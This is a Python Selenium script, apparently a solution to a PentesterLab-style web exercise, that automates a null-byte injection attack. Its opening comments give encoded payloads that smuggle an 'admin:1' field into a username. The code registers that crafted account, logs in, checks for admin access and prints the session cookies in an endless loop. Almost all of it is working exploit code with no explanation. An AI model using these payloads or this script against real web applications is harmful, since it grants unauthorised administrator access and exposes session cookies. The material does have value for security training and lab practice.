#admin privileges - 00user%3Atest%00%00admin%3A1%00 - user = test%00%00admin:1
#become admin1 %00user%3Atest%00%00user%3Aadmin1%00 - user = test%00%00user:admin%00
import unittest
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()
url = "http://ptl-14009dd3-525d193a.libcurl.so/"
driver.get(url)

user = 'test\x00\x00admin:1'
password = 'test'

def register():   
    register = driver.find_element(By.LINK_TEXT, "register")
    register.send_keys(Keys.RETURN)
    username = driver.find_element_by_name("username")
    username.send_keys(user)
    password_list = driver.find_elements_by_tag_name('input')
    for i in range(2,4):
        password_list[i].send_keys(password)
    submit = driver.find_element_by_tag_name("button")
    submit.send_keys(Keys.RETURN)

def login():
    login_link = driver.find_element(By.LINK_TEXT, "Login")
    login_link.send_keys(Keys.RETURN)
    username = driver.find_elements_by_tag_name("input")
    username[1].send_keys(user)
    username[2].send_keys(password) 
    submit = driver.find_element_by_tag_name("button")
    submit.send_keys(Keys.RETURN)

def get_cookie():
    all_cookies = driver.get_cookies()
    print(all_cookies[0])
    for cookie_name, cookie_value in all_cookies[0].items():
        print( cookie_name, cookie_value)

def check_privileges():
    if "You don't have admin privileges" in driver.page_source:
        logout = driver.find_element(By.LINK_TEXT, "Logout")
        logout.send_keys(Keys.RETURN)

while True: 
    register()
    if "already exists" in driver.page_source:
        login()
        check_privileges()
        get_cookie()
    else:
        check_privileges()
#register_button = driver.find_element(By.LINK_TEXT, "Register")
#register_button.send_keys(Keys.RETURN)
#login = driver.find_element(By.LINK_TEXT, "Login")
#login.send_keys(Keys.RETURN)
